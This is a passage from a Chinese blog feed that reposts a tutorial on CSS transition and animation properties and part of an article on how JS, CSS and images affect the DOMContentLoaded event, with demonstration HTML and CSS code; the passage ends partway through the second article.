<p>这其实是一个简写形式，可以单独定义成各个属性。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">img</span>&#123;</div><div class="line">    <span class="attribute">transition-property</span>: height;</div><div class="line">    <span class="attribute">transition-duration</span>: <span class="number">1s</span>;</div><div class="line">    <span class="attribute">transition-delay</span>: <span class="number">1s</span>;</div><div class="line">    <span class="attribute">transition-timing-function</span>: ease;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><br></p>
<p><br></p>
<p><br></p>
<h3 id="1-5-transition的使用注意"><a href="#1-5-transition的使用注意" class="headerlink" title="1.5 transition的使用注意"></a>1.5 transition的使用注意</h3><p>（1）目前，各大浏览器（包括IE 10）都已经支持无前缀的transition，所以transition已经可以很安全地不加浏览器前缀。</p>
<p>（2）不是所有的CSS属性都支持transition，完整的列表查看<a href="http://oli.jp/2010/css-animatable-properties/" target="_blank" rel="external">这里</a>，以及具体的<a href="http://leaverou.github.io/animatable/" target="_blank" rel="external">效果</a>。</p>
<p>（3）<strong>transition需要明确知道，开始状态和结束状态的具体数值，才能计算出中间状态。比如，height从0px变化到100px，transition可以算出中间状态。但是，transition没法算出0px到auto的中间状态，也就是说，如果开始或结束的设置是height: auto，那么就不会产生动画效果。类似的情况还有，display: none到block，background: url(foo.jpg)到url(bar.jpg)等等。</strong></p>
<p><br></p>
<p><br></p>
<p><br></p>
<h3 id="1-6-transition的局限"><a href="#1-6-transition的局限" class="headerlink" title="1.6 transition的局限"></a>1.6 transition的局限</h3><p>transition的优点在于简单易用，但是它有几个很大的局限。</p>
<p>（1）<strong>transition需要事件触发，所以没法在网页加载时自动发生。</strong></p>
<p>（2）<strong>transition是一次性的，不能重复发生，除非一再触发。</strong></p>
<p>（3）<strong>transition只能定义开始状态和结束状态，不能定义中间状态，也就是说只有两个状态。</strong></p>
<p>（4）<strong>一条transition规则，只能定义一个属性的变化，不能涉及多个属性。</strong></p>
<p>CSS Animation就是为了解决这些问题而提出的。</p>
<p><br></p>
<p><br></p>
<p><br></p>
<h2 id="第二部分：CSS-Animation"><a href="#第二部分：CSS-Animation" class="headerlink" title="第二部分：CSS Animation"></a>第二部分：CSS Animation</h2><h3 id="2-1-基本用法"><a href="#2-1-基本用法" class="headerlink" title="2.1 基本用法"></a>2.1 基本用法</h3><p>首先，CSS Animation需要指定动画一个周期持续的时间，以及动画效果的名称。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">div</span><span class="selector-pseudo">:hover</span> &#123;</div><div class="line">  <span class="attribute">animation</span>: <span class="number">1s</span> rainbow;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>上面代码表示，当鼠标悬停在div元素上时，会产生名为rainbow的动画效果，持续时间为1秒。为此，我们还需要用keyframes关键字，定义rainbow效果。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line">@<span class="keyword">keyframes</span> rainbow &#123;</div><div class="line">  0% &#123; <span class="attribute">background</span>: <span class="number">#c00</span>; &#125;</div><div class="line">  50% &#123; <span class="attribute">background</span>: orange; &#125;</div><div class="line">  100% &#123; <span class="attribute">background</span>: yellowgreen; &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>上面代码表示，rainbow效果一共有三个状态，分别为起始（0%）、中点（50%）和结束（100%）。如果有需要，完全可以插入更多状态。效果如下。</p>
<p>默认情况下，动画只播放一次。加入infinite关键字，可以让动画无限次播放。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">div</span><span class="selector-pseudo">:hover</span> &#123;</div><div class="line">  <span class="attribute">animation</span>: <span class="number">1s</span> rainbow infinite;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>也可以指定动画具体播放的次数，比如3次。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">div</span><span class="selector-pseudo">:hover</span> &#123;</div><div class="line">  <span class="attribute">animation</span>: <span class="number">1s</span> rainbow <span class="number">3</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里还有一个<a href="http://lea.verou.me/css-4d/#heart-demo" target="_blank" rel="external">心脏跳动</a>的例子，可供参考。</p>
<p><br></p>
<p><br></p>
<p><br></p>
<h3 id="2-2-animation-fill-mode"><a href="#2-2-animation-fill-mode" class="headerlink" title="2.2 animation-fill-mode"></a>2.2 animation-fill-mode</h3><p><strong>动画结束以后，会立即从结束状态跳回到起始状态。如果想让动画保持在结束状态，需要使用animation-fill-mode属性。</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">div</span><span class="selector-pseudo">:hover</span> &#123;</div><div class="line">  <span class="attribute">animation</span>: <span class="number">1s</span> rainbow forwards;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>forwards表示让动画停留在结束状态</strong>，效果如下。</p>
<p>animation-fill-mode还可以使用下列值。</p>
<blockquote>
<p>（1）none：默认值，回到动画没开始时的状态。</p>
<p>（2）backwards：让动画回到第一帧的状态。</p>
<p>（3）both: 根据animation-direction（见后）轮流应用forwards和backwards规则。</p>
</blockquote>
<p><br></p>
<p><br></p>
<p><br></p>
<h3 id="2-3-animation-direction"><a href="#2-3-animation-direction" class="headerlink" title="2.3 animation-direction"></a>2.3 animation-direction</h3><p>动画循环播放时，每次都是从结束状态跳回到起始状态，再开始播放。animation-direction属性，可以改变这种行为。</p>
<p>下面看一个例子，来说明如何使用animation-direction。假定有一个动画是这样定义的。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line">@<span class="keyword">keyframes</span> rainbow &#123;</div><div class="line">  0% &#123; <span class="attribute">background-color</span>: yellow; &#125;</div><div class="line">  100% &#123; <span class="attribute">background</span>: blue; &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>默认情况是，animation-direction等于normal。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">div</span><span class="selector-pseudo">:hover</span> &#123;</div><div class="line">  <span class="attribute">animation</span>: <span class="number">1s</span> rainbow <span class="number">3</span> normal;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>此外，还可以等于取alternate、reverse、alternate-reverse等值。它们的含义见下图（假定动画连续播放三次）。</p>
<p><img src="http://image.beekka.com/blog/201402/bg2014021401.png" alt="img"></p>
<p>简单说，<strong>animation-direction指定了动画播放的方向，最常用的值是normal和reverse。浏览器对其他值的支持情况不佳，应该慎用。</strong></p>
<p><br></p>
<p><br></p>
<p><br></p>
<h3 id="2-4-animation的各项属性"><a href="#2-4-animation的各项属性" class="headerlink" title="2.4 animation的各项属性"></a>2.4 animation的各项属性</h3><p>同transition一样，animation也是一个简写形式。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">div</span><span class="selector-pseudo">:hover</span> &#123;</div><div class="line">  <span class="attribute">animation</span>: <span class="number">1s</span> <span class="number">1s</span> rainbow linear <span class="number">3</span> forwards normal;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这是一个简写形式，可以分解成各个单独的属性。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">div</span><span class="selector-pseudo">:hover</span> &#123;</div><div class="line">  <span class="attribute">animation-name</span>: rainbow;</div><div class="line">  <span class="attribute">animation-duration</span>: <span class="number">1s</span>;</div><div class="line">  <span class="attribute">animation-timing-function</span>: linear;</div><div class="line">  <span class="attribute">animation-delay</span>: <span class="number">1s</span>;</div><div class="line">    <span class="attribute">animation-fill-mode</span>:forwards;</div><div class="line">  <span class="attribute">animation-direction</span>: normal;</div><div class="line">  <span class="attribute">animation-iteration-count</span>: <span class="number">3</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><br></p>
<p><br></p>
<p><br></p>
<h3 id="2-5-keyframes的写法"><a href="#2-5-keyframes的写法" class="headerlink" title="2.5 keyframes的写法"></a>2.5 keyframes的写法</h3><p>keyframes关键字用来定义动画的各个状态，它的写法相当自由。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line">@<span class="keyword">keyframes</span> rainbow &#123;</div><div class="line">  0% &#123; <span class="attribute">background</span>: <span class="number">#c00</span> &#125;</div><div class="line">  50% &#123; <span class="attribute">background</span>: orange &#125;</div><div class="line">  100% &#123; <span class="attribute">background</span>: yellowgreen &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>0%可以用from代表，100%可以用to代表</strong>，因此上面的代码等同于下面的形式。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line">@<span class="keyword">keyframes</span> rainbow &#123;</div><div class="line">  <span class="selector-tag">from</span> &#123; <span class="attribute">background</span>: <span class="number">#c00</span> &#125;</div><div class="line">  50% &#123; <span class="attribute">background</span>: orange &#125;</div><div class="line">  <span class="selector-tag">to</span> &#123; <span class="attribute">background</span>: yellowgreen &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>如果省略某个状态，浏览器会自动推算中间状态</strong>，所以下面都是合法的写法。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line">@<span class="keyword">keyframes</span> rainbow &#123;</div><div class="line">  50% &#123; <span class="attribute">background</span>: orange &#125;</div><div class="line">  <span class="selector-tag">to</span> &#123; <span class="attribute">background</span>: yellowgreen &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">@<span class="keyword">keyframes</span> rainbow &#123;</div><div class="line">  <span class="selector-tag">to</span> &#123; <span class="attribute">background</span>: yellowgreen &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>甚至，可以把多个状态写在一行。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line">@<span class="keyword">keyframes</span> pound &#123;</div><div class="line">  <span class="selector-tag">from</span>，<span class="selector-tag">to</span> &#123; <span class="attribute">transform</span>: none; &#125;</div><div class="line">  50% &#123; <span class="attribute">transform</span>: <span class="built_in">scale</span>(1.2); &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>另外一点需要注意的是，浏览器从一个状态向另一个状态过渡，是平滑过渡。<code>steps</code> 函数可以实现<strong>分步过渡</strong>。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">div</span><span class="selector-pseudo">:hover</span> &#123;</div><div class="line">  <span class="attribute">animation</span>: <span class="number">1s</span> rainbow infinite <span class="built_in">steps</span>(10);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里有一个非常神奇的<a href="http://dabblet.com/gist/1745856" target="_blank" rel="external">例子</a>，可以看到steps函数的用处。</p>
<p><br></p>
<p><br></p>
<p><br></p>
<h3 id="2-6-animation-play-state"><a href="#2-6-animation-play-state" class="headerlink" title="2.6 animation-play-state"></a>2.6 animation-play-state</h3><p>有时，<strong>动画播放过程中，会突然停止</strong>。这时，<strong>默认行为是跳回到动画的开始状态。</strong></p>
<p>上面动画中，如果鼠标移走，色块立刻回到动画开始状态。</p>
<p><strong>如果想让动画保持突然终止时的状态，就要使用animation-play-state属性</strong>。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">div</span> &#123;</div><div class="line">    <span class="attribute">animation</span>: spin <span class="number">1s</span> linear infinite;</div><div class="line">    <span class="attribute">animation-play-state</span>: paused;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-tag">div</span><span class="selector-pseudo">:hover</span> &#123;</div><div class="line">  <span class="attribute">animation-play-state</span>: running;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>上面的代码指定，没有鼠标没有悬停时，动画状态是暂停；一旦悬停，动画状态改为继续播放。</p>
<p><br></p>
<p><br></p>
<p><br></p>
<h3 id="2-7-浏览器前缀"><a href="#2-7-浏览器前缀" class="headerlink" title="2.7 浏览器前缀"></a>2.7 浏览器前缀</h3><p>目前，IE 10和Firefox（&gt;= 16）支持没有前缀的animation，而chrome不支持，所以必须使用webkit前缀。</p>
<p>也就是说，实际运用中，代码必须写成下面的样子。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">div</span><span class="selector-pseudo">:hover</span> &#123;</div><div class="line">  <span class="attribute">-webkit-animation</span>: <span class="number">1s</span> rainbow;</div><div class="line">  <span class="attribute">animation</span>: <span class="number">1s</span> rainbow;  </div><div class="line">&#125;</div><div class="line"></div><div class="line">@-<span class="keyword">webkit</span>-<span class="keyword">keyframes</span> rainbow &#123;</div><div class="line">  0% &#123; <span class="attribute">background</span>: <span class="number">#c00</span>; &#125;</div><div class="line">  50% &#123; <span class="attribute">background</span>: orange; &#125;</div><div class="line">  100% &#123; <span class="attribute">background</span>: yellowgreen; &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">@<span class="keyword">keyframes</span> rainbow &#123;</div><div class="line">  0% &#123; <span class="attribute">background</span>: <span class="number">#c00</span>; &#125;</div><div class="line">  50% &#123; <span class="attribute">background</span>: orange; &#125;</div><div class="line">  100% &#123; <span class="attribute">background</span>: yellowgreen; &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><br></p>
<p><br></p>
<p><br></p>
<p>-end-</p>
<p>原文地址: <a href="http://www.ruanyifeng.com/blog/2014/02/css_transition_and_animation.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2014/02/css_transition_and_animation.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;CSS动画简介&quot;&gt;&lt;a href=&quot;#CSS动画简介&quot; class=&quot;headerlink&quot; title=&quot;CSS动画简介&quot;&gt;&lt;/a&gt;CSS动画简介&lt;/h2&gt;&lt;p&gt;作者： &lt;a href=&quot;http://www.ruanyifeng.com/&quot; target=&quot;_
    
    </summary>
    
      <category term="CSS" scheme="http://www.wanglinzhizhi.me/categories/CSS/"/>
    
    
      <category term="CSS3" scheme="http://www.wanglinzhizhi.me/tags/CSS3/"/>
    
      <category term="CSS" scheme="http://www.wanglinzhizhi.me/tags/CSS/"/>
    
      <category term="CSS3动画" scheme="http://www.wanglinzhizhi.me/tags/CSS3%E5%8A%A8%E7%94%BB/"/>
    
      <category term="阮一峰" scheme="http://www.wanglinzhizhi.me/tags/%E9%98%AE%E4%B8%80%E5%B3%B0/"/>
    
  </entry>
  
  <entry>
    <title>JS、CSS以及img对DOMContentLoaded事件的影响</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/DOMContent/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/DOMContent/</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-01-21T10:51:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JS、CSS以及img对DOMContentLoaded事件的影响"><a href="#JS、CSS以及img对DOMContentLoaded事件的影响" class="headerlink" title="JS、CSS以及img对DOMContentLoaded事件的影响"></a>JS、CSS以及img对DOMContentLoaded事件的影响</h2><p>In <a href="http://www.alloyteam.com/webdevelop/web-%e5%89%8d%e7%ab%af%e4%bc%98%e5%8c%96/" target="_blank" rel="external">Web 前端优化</a>,<a href="http://www.alloyteam.com/webdevelop/" target="_blank" rel="external">Web开发</a> </p>
<p>on 2014年03月03日 by <a href="http://www.alloyteam.com/author/kerry95/" target="_blank" rel="external">TAT.kerry95</a> view: 17,634<a href="http://www.alloyteam.com/2014/03/effect-js-css-and-img-event-of-domcontentloaded/#comments" target="_blank" rel="external">12</a></p>
<p>最近在做性能有关的数据上报，发现了两个非常有意思的东西：Chrome开发者工具的Timeline分析面板，以及DOMContentLoaded事件。一个是强大的令人发指的性能分析工具，一个是重要的性能指标，于是就用Timeline对DOMContentLoaded事件进行了一番研究。</p>
<h2 id="前端的纯技术就是对规范的认知"><a href="#前端的纯技术就是对规范的认知" class="headerlink" title="前端的纯技术就是对规范的认知"></a>前端的纯技术就是对规范的认知</h2><p>什么是DOMContentLoaded事件？</p>
<p>首先想到的是查看<a href="http://www.w3.org/TR/html5/syntax.html#the-end" target="_blank" rel="external">W3C的HTML5规范</a>，DOMContentLoaded事件在什么时候触发：</p>
<blockquote>
<p>Once the user agent stops parsing the document, the user agent must run the following steps:<br>\1. Set the current document readiness to “interactive” and the insertion point to undefined.<br>Pop all the nodes off the stack of open elements.<br>\2. If the list of scripts that will execute when the document has finished parsing is not empty, run these substeps:<br>2.1 Spin the event loop until the first script in the list of scripts that will execute when the document has finished parsing has its “ready to be parser-executed” flag set and the parser’s Document has no style sheet that is blocking scripts.<br>2.2 Execute the first script in the list of scripts that will execute when the document has finished parsing.<br>2.3 Remove the first script element from the list of scripts that will execute when the document has finished parsing (i.e. shift out the first entry in the list).<br>2.4 If the list of scripts that will execute when the document has finished parsing is still not empty, repeat these substeps again from substep 1.<br>\3. Queue a task to fire a simple event that bubbles named <strong>DOMContentLoaded</strong> at the Document.</p>
</blockquote>
<p>规范总是那么的晦涩，但至少有一点是可以明确了的，就是在JS（不包括动态插入的JS）执行完之后，才会触发DOMContentLoaded事件。</p>
<p>接下来看看<a href="https://developer.mozilla.org/en-US/docs/Web/Reference/Events/DOMContentLoaded" target="_blank" rel="external">MDN上有关DOMContentLoaded事件的文档</a>：</p>
<blockquote>
<p>The DOMContentLoaded event is fired when the document has been completely loaded and parsed, without waiting for stylesheets, images, and subframes to finish loading<br>Note: Stylesheet loads block script execution, so if you have a <code>after a</code>, the page will not finish parsing – and DOMContentLoaded will not fire – until the stylesheet is loaded.</p>
</blockquote>
<p>这么看来，至少可以得出这么一个理论：DOMContentLoaded事件本身不会等待CSS文件、图片、iframe加载完成。<br>它的触发时机是：加载完页面，解析完所有标签（不包括执行CSS和JS），并如规范中所说的设置<code>interactive</code> 和执行每个静态的script标签中的JS，然后触发。<br>而JS的执行，需要等待位于它前面的CSS加载（如果是外联的话）、执行完成，因为JS可能会依赖位于它前面的CSS计算出来的样式。</p>
<h2 id="实践是检验真理的唯一标准"><a href="#实践是检验真理的唯一标准" class="headerlink" title="实践是检验真理的唯一标准"></a>实践是检验真理的唯一标准</h2><h3 id="实验1：DOMContentLoaded事件不直接等待CSS文件、图片的加载完成"><a href="#实验1：DOMContentLoaded事件不直接等待CSS文件、图片的加载完成" class="headerlink" title="实验1：DOMContentLoaded事件不直接等待CSS文件、图片的加载完成"></a>实验1：DOMContentLoaded事件不直接等待CSS文件、图片的加载完成</h3><p>index.html:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-CN"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"./css/main.css"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Content<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./img/chrome-girl.jpg"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p><a href="http://cdn.alloyteam.com/wp-content/uploads/2014/03/71fca778-a249-11e3-8824-2aae4440c857.png" target="_blank" rel="external"><img src="http://cdn.alloyteam.com/wp-content/uploads/2014/03/71fca778-a249-11e3-8824-2aae4440c857.png" alt="71fca778-a249-11e3-8824-2aae4440c857"></a><br>图一</p>
<p>如果页面中没有script标签，DOMContentLoaded事件并没有等待CSS文件、图片加载完成。</p>
<p>Chrome开发者工具的Timeline面板可以帮我们记录下浏览器的一举一动。图一中红色小方框中的蓝线，表示DOMContentLoaded事件，它右边的红线和绿线分别表示load事件和First paint，鼠标hover在这些线露出灰色方框下面的一小部分时就会出现带有说明文字的tips（这交互够反人类的对吧！）。</p>
<h3 id="实验2：DOMContentLoaded事件需要等待JS执行完才触发"><a href="#实验2：DOMContentLoaded事件需要等待JS执行完才触发" class="headerlink" title="实验2：DOMContentLoaded事件需要等待JS执行完才触发"></a>实验2：DOMContentLoaded事件需要等待JS执行完才触发</h3><p>index.html:<br><figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-CN"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line">        <span class="built_in">console</span>.timeStamp(<span class="string">'Inline script before link in head'</span>);</div><div class="line">        <span class="built_in">window</span>.addEventListener(<span class="string">'DOMContentLoaded'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">            <span class="built_in">console</span>.timeStamp(<span class="string">'DOMContentLoaded event'</span>);</div><div class="line">        &#125;);</div><div class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"./css/main.css"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line">        <span class="built_in">console</span>.timeStamp(<span class="string">'Inline script after link in head'</span>);</div><div class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Content<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./img/chrome-girl.jpg"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"./js/main.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>main.js:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="built_in">console</span>.timeStamp(<span class="string">'External script after link in body'</span>);</div></pre></td></tr></table></figure>
<p><a href="http://cdn.alloyteam.com/wp-content/uploads/2014/03/dcf399e8-a252-11e3-92c1-c3dbad820909.png" target="_blank" rel="external"><img src="http://cdn.alloyteam.com/wp-content/uploads/2014/03/dcf399e8-a252-11e3-92c1-c3dbad820909.png" alt="dcf399e8-a252-11e3-92c1-c3dbad820909"></a></p>
<p>图二</p>
<p>如果页面中静态的写有script标签，DOMContentLoaded事件需要等待JS执行完才触发。<br>而script标签中的JS需要等待位于其前面的CSS的加载完成。</p>
<p><code>console.timeStamp()</code> 可以向Timeline中添加一条记录，并对应上方的一条黄线。</p>
<p>从图二中可以看出，在CSS之前的JS立刻得到了执行，而在CSS之后的JS，需要等待CSS加载完后才执行，比较明显的是main.js早就加载完了，但还是要等main.css加载完才能执行。而DOMContentLoaded事件，则是在JS执行完后才触发。滑动Timeline面板中表示展示区域的滑块，如图三，放大后即可看到表示DOMContentLoaded事件的蓝线（之前跟黄线和绿线靠的太近了），当然，通过<code>console.timeStamp()</code> 向TimeLine中添加的记录也可证明其触发时间。</p>
<p><a href="http://cdn.alloyteam.com/wp-content/uploads/2014/03/910b5c2c-a253-11e3-995d-e19fb254cf4e.png" target="_blank" rel="external"><img src="http://cdn.alloyteam.com/wp-content/uploads/2014/03/910b5c2c-a253-11e3-995d-e19fb254cf4e.png" alt="910b5c2c-a253-11e3-995d-e19fb254cf4e"></a><br>图三</p>
<p>现代浏览器会并发的预加载CSS, JS，也就是一开始就并发的请求这些资源，但是，执行CSS和JS的顺序还是按原来的依赖顺序（JS的执行要等待位于其前面的CSS和JS加载、执行完）。先加载完成的资源，如果其依赖还没加载、执行完，就只能等着。</p>
<h3 id="实验3：img何时开始解码、绘制？"><a href="#实验3：img何时开始解码、绘制？" class="headerlink" title="实验3：img何时开始解码、绘制？"></a>实验3：img何时开始解码、绘制？</h3><p>从图三中我们可以发现一个有趣的地方：img的请求老早就发出了，但延迟了一段时间才开始解码。如图二、图三中的红框所示，截图中只框出了一部分表示解码的记录，而实际上这些表示解码的记录一直持续到img加载结束，如图四所示，img是一边加载一边解码的：</p>
<p><a href="http://cdn.alloyteam.com/wp-content/uploads/2014/03/7384a57a-a256-11e3-9c4a-b857956eaeed.png" target="_blank" rel="external"><img src="http://cdn.alloyteam.com/wp-content/uploads/2014/03/7384a57a-a256-11e3-9c4a-b857956eaeed.png" alt="7384a57a-a256-11e3-9c4a-b857956eaeed"></a><br>图四</p>
<p>抱着“猜想——验证”的想法，我猜想这是因为img这个资源是否需要展现出来，需要等 <strong>所有的JS和CSS的执行完</strong> 才知道，因为main.js可能会执行某些DOM操作，比如删除这个img元素，或者修改其src属性，而CSS可能会将其 <code>display: none</code> 。</p>
<p><a href="http://cdn.alloyteam.com/wp-content/uploads/auto_save_image/2014/03/084830tW2.jpg" target="_blank" rel="external"><img src="http://cdn.alloyteam.com/wp-content/uploads/auto_save_image/2014/03/084830tW2.jpg" alt="image"></a></p>
<p>图五</p>
<p><a href="http://cdn.alloyteam.com/wp-content/uploads/auto_save_image/2014/03/084831TR6.jpg" target="_blank" rel="external"><img src="http://cdn.alloyteam.com/wp-content/uploads/auto_save_image/2014/03/084831TR6.jpg" alt="image"></a></p>
<p>图六</p>
<p><a href="http://cdn.alloyteam.com/wp-content/uploads/auto_save_image/2014/03/084832Sa1.jpg" target="_blank" rel="external"><img src="http://cdn.alloyteam.com/wp-content/uploads/auto_save_image/2014/03/084832Sa1.jpg" alt="image"></a><br>图七</p>
<p>图五中没有JS和CSS，img的数据一接收到就马上开始解码了。<br>图六中没有JS，但img要等到CSS加载完才开始解码。<br>图七的代码跟图六的代码唯一的区别是CSS把img给 <code>display: none;</code> ，这使得img虽然请求了，但根本没有进行解码。<br>这说明，img是否需要解码、绘图（paint）出来，确实需要等CSS加载、执行完才能知道。也就是说，CSS会阻塞img的展现！那么JS呢？</p>
<p><a href="http://cdn.alloyteam.com/wp-content/uploads/auto_save_image/2014/03/084833Gpg.jpg" target="_blank" rel="external"><img src="http://cdn.alloyteam.com/wp-content/uploads/auto_save_image/2014/03/084833Gpg.jpg" alt="image"></a><br>图八</p>
<p>图八对应的代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-CN"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line">        <span class="built_in">console</span>.timeStamp(<span class="string">'Inline script in head'</span>);</div><div class="line">        <span class="built_in">window</span>.addEventListener(<span class="string">'DOMContentLoaded'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">            <span class="built_in">console</span>.timeStamp(<span class="string">'DOMContentLoaded event'</span>);</div><div class="line">        &#125;);</div><div class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Content<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./img/chrome-girl.jpg"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"./js/main.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
